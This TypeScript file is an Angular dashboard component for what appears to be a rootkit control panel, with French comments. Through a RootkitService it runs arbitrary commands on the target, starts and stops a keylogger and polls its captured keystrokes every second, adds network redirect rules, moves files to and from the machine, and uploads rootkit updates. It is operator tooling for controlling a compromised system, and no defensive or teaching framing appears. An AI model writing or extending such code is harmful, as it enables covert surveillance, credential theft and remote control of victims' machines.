import { Component, OnInit } from '@angular/core';
import { CommonModule } from '@angular/common';
import { RouterModule } from '@angular/router';
import { FormsModule } from '@angular/forms';
import { RootkitService, RedirectRule, CommandResponse } from '../../services/rootkit.service';

@Component({
  selector: 'app-dashboard',
  standalone: true,
  imports: [CommonModule, RouterModule, FormsModule],
  templateUrl: './dashboard.component.html',
  styleUrls: ['./dashboard.component.scss']
})
export class DashboardComponent implements OnInit {
  command: string = '';
  commandOutput: string = '';
  keylogOutput: string = '';
  isKeyloggerRunning: boolean = false;
  redirectRules: RedirectRule[] = [];
  selectedFile: File | null = null;
  files: string[] = []; // Liste des fichiers disponibles

  constructor(private rootkitService: RootkitService) {}

  ngOnInit(): void {
    this.loadRedirectRules();
    this.loadFiles();
  }

  loadFiles(): void {
    this.rootkitService.listFiles().subscribe({
      next: (files) => {
        this.files = files;
      },
      error: (err) => {
        console.error('Erreur lors du chargement des fichiers:', err);
      }
    });
  }

  executeCommand(): void {
    if (!this.command) return;
    this.rootkitService.executeCommand(this.command).subscribe({
      next: (response: CommandResponse) => {
        this.commandOutput = response.error ? `Erreur: ${response.error}\n${response.output}` : response.output;
        this.command = '';
      },
      error: (err) => {
        this.commandOutput = `Erreur: ${err.message}`;
      }
    });
  }

  toggleKeylogger(): void {
    if (this.isKeyloggerRunning) {
      this.rootkitService.stopKeylogger().subscribe({
        next: () => {
          this.isKeyloggerRunning = false;
          this.keylogOutput = '';
        }
      });
    } else {
      this.rootkitService.startKeylogger().subscribe({
        next: () => {
          this.isKeyloggerRunning = true;
          this.startKeylogPolling();
        }
      });
    }
  }

  private startKeylogPolling(): void {
    setInterval(() => {
      if (this.isKeyloggerRunning) {
        this.rootkitService.getKeylog().subscribe({
          next: (response) => {
            this.keylogOutput = response;
          }
        });
      }
    }, 1000);
  }

  addRedirectRule(rule: RedirectRule): void {
    this.rootkitService.addRedirectRule(rule).subscribe({
      next: () => {
        this.loadRedirectRules();
      }
    });
  }

  removeRedirectRule(source: string): void {
    this.rootkitService.removeRedirectRule(source).subscribe({
      next: () => {
        this.loadRedirectRules();
      }
    });
  }

  private loadRedirectRules(): void {
    this.rootkitService.listRedirectRules().subscribe({
      next: (rules) => {
        this.redirectRules = rules;
      }
    });
  }

  onFileSelected(event: Event): void {
    const input = event.target as HTMLInputElement;
    if (input.files?.length) {
      this.selectedFile = input.files[0];
    }
  }

  uploadFile(): void {
    if (!this.selectedFile) return;
    this.rootkitService.uploadFile(this.selectedFile).subscribe({
      next: () => {
        console.log('Fichier téléchargé avec succès');
        this.selectedFile = null;
        this.loadFiles();
      }
    });
  }

  downloadFile(filename: string): void {
    this.rootkitService.downloadFile(filename).subscribe({
      next: (blob) => {
        const url = window.URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = filename;
        a.click();
        window.URL.revokeObjectURL(url);
      }
    });
  }

  updateRootkit(): void {
    if (!this.selectedFile) return;
    this.rootkitService.updateRootkit(this.selectedFile).subscribe({
      next: () => {
        console.log('Rootkit mis à jour avec succès');
        this.selectedFile = null;
      }
    });
  }
} 